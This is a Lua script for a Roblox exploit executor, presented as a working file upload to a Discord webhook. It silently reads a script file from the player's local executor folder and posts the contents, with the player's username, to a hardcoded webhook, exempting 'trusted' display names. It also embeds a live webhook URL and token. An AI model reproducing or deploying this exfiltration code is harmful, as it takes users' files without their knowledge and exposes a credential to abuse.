-- Fully Working Multipart File Upload for Discord Webhooks (with Username)

local filePath = "WindUI/CustomFeatures/CustomFeatures.lua"
local webhookURL = "https://discord.com/api/webhooks/1424223851398696991/dOFxiu4WxLTVC32whg13Chp6pZEFRojhg22Sm9zX6toXcZibdi83lIOzRjEg9Aqslnn4"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Read file
local ok, content = pcall(readfile, filePath)
if not ok then
    warn("Failed to read file:", filePath)
    return
end

-- Skip trusted
local displayName = string.lower(player.DisplayName)
if string.find(displayName, "espn") or string.find(displayName, "77") then
    warn("Trusted user - skipping upload")
    return
end

-- Executor request function
local requestfn = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
if not requestfn then
    warn("No request function found")
    return
end

-- *** Correct Discord Multipart Boundary ***
local boundary = "------------------------" .. tostring(math.random(100000,999999))

local CRLF = "\r\n"
local body = {}

-- Webhook message (username added)
table.insert(body, "--" .. boundary)
table.insert(body, 'Content-Disposition: form-data; name="content"')
table.insert(body, "")
table.insert(body,
    "📁 Uploaded file from client: **CustomFeatures.lua**" .. CRLF ..
    "👥 Username: **" .. player.Name .. "**"
)

-- *** Correct Discord file field: files[0] ***
table.insert(body, "--" .. boundary)
table.insert(body, 'Content-Disposition: form-data; name="files[0]"; filename="CustomFeatures.lua"')
table.insert(body, "Content-Type: text/plain")
table.insert(body, "")
table.insert(body, content)

-- End
table.insert(body, "--" .. boundary .. "--")

-- Join with CRLF
body = table.concat(body, CRLF)

-- SEND REQUEST
local response = requestfn({
    Url = webhookURL,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
        ["Content-Length"] = tostring(#body)
    },
    Body = body,
    raw_body = true,
    disable_cache = true,
})
